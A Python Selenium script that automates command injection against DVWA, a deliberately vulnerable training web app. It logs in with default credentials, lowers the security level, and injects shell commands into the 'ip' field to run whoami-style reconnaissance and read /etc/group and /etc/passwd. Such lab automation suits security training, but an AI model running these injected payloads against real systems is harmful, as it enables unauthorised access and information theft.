from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import Select
import time

def command(host):
	timeToSleep=2

	# create a new Firefox session
	driver = webdriver.Firefox()
	driver.maximize_window()

	driver.get("http://" + host + "/dvwa/login.php")
	# get the search textbox
	username = driver.find_element(By.NAME,"username")
	password=driver.find_element(By.NAME,"password")

	# logging into DVWA  
	# enter search keyword and submit
	username.send_keys("admin")
	password.send_keys("password")
	login=driver.find_element(By.NAME,"Login")
	time.sleep(2)
	login.click()

	driver.get("http://" + host + "/dvwa/security.php")
	searchele=driver.find_element(By.NAME,"security")
	s=Select(searchele)
	s.select_by_value("low")
	submit= driver.find_element(By.NAME,"seclev_submit")
	submit.click()
	time.sleep(2)

	driver.get("http://" + host + "/dvwa/setup.php")
	resetele=driver.find_element(By.NAME,"create_db")
	resetele.click()
	time.sleep(3)

	# the following code performs the exploits using "command execution"
	driver.get("http://"+host+"/dvwa/vulnerabilities/exec/")

	# finding the present working directory, current use name and process running
	cmd_section = driver.find_element(By.NAME,"ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(host)
	time.sleep(timeToSleep)
	submit = driver.find_element(By.NAME,"submit")
	submit.click()

	time.sleep(10)

	cmd_section = driver.find_element(By.NAME,"ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";pwd & whoaim & ps")
	time.sleep(timeToSleep)
	submit = driver.find_element(By.NAME,"submit")
	submit.click()

	time.sleep(10)

	# knowing information about OS and users  
	cmd_section = driver.find_element(By.NAME,"ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";uname -a & users & id & w")
	time.sleep(timeToSleep)
	submit = driver.find_element(By.NAME,"submit")
	submit.click()

	time.sleep(10)

	# knowing the list of files present in a location 
	cmd_section = driver.find_element(By.NAME,"ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys("; ls -al")
	time.sleep(timeToSleep)
	time.sleep(timeToSleep)
	submit = driver.find_element(By.NAME,"submit")
	submit.click()

	time.sleep(10)

	# the groups present on this system 
	cmd_section = driver.find_element(By.NAME,"ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";cat /etc/group")
	time.sleep(timeToSleep)
	submit = driver.find_element(By.NAME,"submit")
	submit.click()

	time.sleep(10)

	# getting the passwd file contents 
	cmd_section = driver.find_element(By.NAME,"ip")
	time.sleep(timeToSleep)
	cmd_section.send_keys(";cat /etc/passwd")
	time.sleep(timeToSleep)
	submit = driver.find_element(By.NAME,"submit")
	submit.click()

	time.sleep(10)